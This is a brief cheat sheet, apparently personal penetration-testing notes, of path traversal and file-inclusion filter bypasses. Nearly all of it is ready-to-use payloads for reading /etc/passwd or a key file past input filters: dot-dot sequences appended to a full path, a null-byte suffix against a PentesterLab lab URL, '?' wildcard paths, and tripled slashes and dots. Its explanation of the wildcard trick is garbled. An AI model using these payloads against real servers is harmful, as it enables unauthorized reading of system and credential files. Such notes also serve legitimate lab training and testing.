**Filter bypass: append path at the end**

If you see a full path being used, you can calculate how many directories there is upp.
eg: example.com/file.php?path=/var/www/love.jpg

You can therefore use the following payload:
/var/www/love.jpg/../../etc/passwd

**Filter bypass: Adding nullbyte %00**
Append a nullbyte at the end, for example:
http://ptl-0a5de95b-d78ba17e.libcurl.so/file.php?file=../../../pentesterlab.key%00


**??? character bypass**
If paths are blacklisted, use the following payload:
/??c/pas???
The ? character will used to find a file names, matching the name of the character used in the path

**Filter bypass: Tripple slash forward or backwards with dots**
Add two or three slashes with same amount of dots either backards or forward:
...///...///etc///passwd

or

...\\\...\\\etc\\\passwd

